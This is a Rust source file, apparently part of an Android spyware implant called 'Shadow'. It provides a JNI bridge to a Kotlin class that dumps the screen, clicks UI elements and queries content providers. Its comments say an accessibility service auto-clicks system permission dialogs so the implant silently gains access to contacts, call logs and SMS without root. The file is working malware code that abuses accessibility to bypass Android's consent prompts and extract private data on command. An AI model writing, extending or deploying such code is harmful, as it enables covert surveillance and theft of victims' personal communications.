//! Android JNI bridge — calls back into Kotlin (ShadowBridge) to execute
//! data-extraction and UI-automation primitives with the implant's own UID.
//!
//! Nothing here needs root or Shizuku. Permission-gated reads (contacts, call
//! log, SMS) work because the a11y service auto-clicks the system permission
//! dialogs, granting the perms to our own package.

use jni::objects::{GlobalRef, JObject, JString, JValue};
use jni::JavaVM;
use std::sync::OnceLock;

static VM: OnceLock<JavaVM> = OnceLock::new();

/// Called once from nativeInit so later threads can attach.
pub fn set_vm(vm: JavaVM) {
    let _ = VM.set(vm);
}

/// Global ref to com.shadow.ShadowBridge, resolved once from a Java thread.
///
/// A thread attached through AttachCurrentThread resolves FindClass through the
/// bootstrap class loader, so it cannot see application classes: every
/// find_class("com/shadow/ShadowBridge") issued from a tokio worker failed with
/// ClassNotFoundException. That exception then reached the thread's uncaught
/// handler and killed the process, which made Android treat the bound
/// accessibility service as crashed and disable it until it was toggled again.
///
/// Caching the class from nativeInit -- a Java-initiated call, where the app's
/// own class loader is in scope -- removes FindClass from native-thread paths.
static BRIDGE_CLASS: OnceLock<GlobalRef> = OnceLock::new();

/// Must be called from nativeInit, with the JNIEnv the JVM supplied.
pub fn cache_bridge_class(env: &mut jni::JNIEnv) {
    if BRIDGE_CLASS.get().is_some() {
        return;
    }
    match env.find_class("com/shadow/ShadowBridge") {
        Ok(class) => match env.new_global_ref(class) {
            Ok(global) => {
                let _ = BRIDGE_CLASS.set(global);
                log::info!("JNI: ShadowBridge cached from Java thread");
            }
            Err(_) => {
                let _ = env.exception_clear();
                log::error!("JNI: could not global-ref ShadowBridge");
            }
        },
        // Always clear: a pending Java exception left here resurfaces later on
        // whichever thread next touches JNI, as an uncaught exception.
        Err(_) => {
            let _ = env.exception_clear();
            log::error!("JNI: ShadowBridge not found during nativeInit");
        }
    }
}

/// The cached bridge class, or None if nativeInit never cached it. Performs no
/// class lookup, so it is safe to call from any thread.
fn bridge_class() -> Option<&'static GlobalRef> {
    BRIDGE_CLASS.get()
}

/// Call a static String-returning method on com.shadow.ShadowBridge.
fn call_bridge_string(method: &str, args: &[JValue]) -> String {
    let vm = match VM.get() {
        Some(v) => v,
        None => return "jni: vm not set".into(),
    };
    let mut env = match vm.attach_current_thread() {
        Ok(e) => e,
        Err(e) => return format!("jni: attach failed: {}", e),
    };
    let class = match bridge_class() {
        Some(c) => c,
        None => return "jni: bridge class not cached (nativeInit?)".to_string(),
    };
    match env.call_static_method(class, method, proto_for(method).as_str(), args) {
        Ok(v) => match v.l() {
            Ok(obj) => {
                let jstr: JString = obj.into();
                // Bind to a local so the JavaStr temporary drops before jstr.
                let out = match env.get_string(&jstr) {
                    Ok(s) => s.into(),
                    Err(e) => format!("jni: get_string failed: {}", e),
                };
                out
            }
            Err(e) => format!("jni: bad return: {}", e),
        },
        Err(e) => {
            // Clear the pending Java exception so the VM stays usable.
            let _ = env.exception_clear();
            format!("jni: call {} failed: {}", method, e)
        }
    }
}

/// Call a static boolean-returning method on com.shadow.ShadowBridge.
fn call_bridge_bool(method: &str, args: &[JValue]) -> bool {
    let vm = match VM.get() {
        Some(v) => v,
        None => return false,
    };
    let mut env = match vm.attach_current_thread() {
        Ok(e) => e,
        Err(_) => return false,
    };
    let class = match bridge_class() {
        Some(c) => c,
        None => return false,
    };
    match env.call_static_method(class, method, proto_for(method).as_str(), args) {
        Ok(v) => v.z().unwrap_or(false),
        Err(_) => {
            let _ = env.exception_clear();
            false
        }
    }
}

/// JNI signatures for the ShadowBridge methods we call.
fn proto_for(method: &str) -> String {
    match method {
        "dumpScreen" | "startAutoGrant" | "grantedPermissions" | "runningApps" => {
            "()Ljava/lang/String;".into()
        }
        "clickByText" | "clickNodeById" => "(Ljava/lang/String;)Z".into(),
        _ => "()Ljava/lang/String;".into(),
    }
}

// ---------------------------------------------------------------------------
// Public primitives used by execute_command()
// ---------------------------------------------------------------------------

pub fn a11y_dump_screen() -> String {
    call_bridge_string("dumpScreen", &[])
}

pub fn a11y_click_text(needle: &str) -> String {
    let vm = match VM.get() {
        Some(v) => v,
        None => return "jni: vm not set".into(),
    };
    let mut env = match vm.attach_current_thread() {
        Ok(e) => e,
        Err(e) => return format!("jni: attach failed: {}", e),
    };
    let jneedle = match env.new_string(needle) {
        Ok(s) => s,
        Err(e) => return format!("jni: new_string failed: {}", e),
    };
    let ok = call_bridge_bool("clickByText", &[JValue::Object(&jneedle)]);
    if ok { "clicked".into() } else { "no matching clickable node".into() }
}

pub fn a11y_click_id(view_id: &str) -> String {
    let vm = match VM.get() {
        Some(v) => v,
        None => return "jni: vm not set".into(),
    };
    let mut env = match vm.attach_current_thread() {
        Ok(e) => e,
        Err(e) => return format!("jni: attach failed: {}", e),
    };
    let jid = match env.new_string(view_id) {
        Ok(s) => s,
        Err(e) => return format!("jni: new_string failed: {}", e),
    };
    let ok = call_bridge_bool("clickNodeById", &[JValue::Object(&jid)]);
    if ok { "clicked".into() } else { "node not found".into() }
}

pub fn a11y_start_autogrant() -> String {
    call_bridge_string("startAutoGrant", &[])
}

pub fn granted_permissions() -> String {
    call_bridge_string("grantedPermissions", &[])
}

pub fn running_apps() -> String {
    call_bridge_string("runningApps", &[])
}

// ---------------------------------------------------------------------------
// Own-UID content providers (no shell, no root — ContentResolver direct)
// ---------------------------------------------------------------------------

/// Query a content:// URI from Kotlin with a JNI helper that uses ContentResolver.
/// Falls back to an explanatory string if the helper is missing.
pub fn query_provider(uri: String, projection: String, limit: i32) -> String {
    let vm = match VM.get() {
        Some(v) => v,
        None => return "jni: vm not set".into(),
    };
    let mut env = match vm.attach_current_thread() {
        Ok(e) => e,
        Err(e) => return format!("jni: attach failed: {}", e),
    };
    let class = match bridge_class() {
        Some(c) => c,
        None => {
            let _ = env.exception_clear();
            return "jni: bridge class not cached (nativeInit?)".to_string();
        }
    };
    let juri = match env.new_string(&uri) {
        Ok(s) => s,
        Err(e) => return format!("jni: new_string failed: {}", e),
    };
    let jproj = match env.new_string(&projection) {
        Ok(s) => s,
        Err(e) => return format!("jni: new_string failed: {}", e),
    };
    let args = [
        JValue::Object(&juri),
        JValue::Object(&jproj),
        JValue::Int(limit),
    ];
    match env.call_static_method(
        class,
        "queryProvider",
        "(Ljava/lang/String;Ljava/lang/String;I)Ljava/lang/String;",
        &args,
    ) {
        Ok(v) => match v.l() {
            Ok(obj) => {
                let jstr: JString = JObject::from(obj).into();
                let out = match env.get_string(&jstr) {
                    Ok(s) => s.into(),
                    Err(e) => format!("jni: get_string failed: {}", e),
                };
                out
            }
            Err(e) => format!("jni: bad return: {}", e),
        },
        Err(e) => {
            let _ = env.exception_clear();
            format!("jni: queryProvider failed: {}", e)
        }
    }
}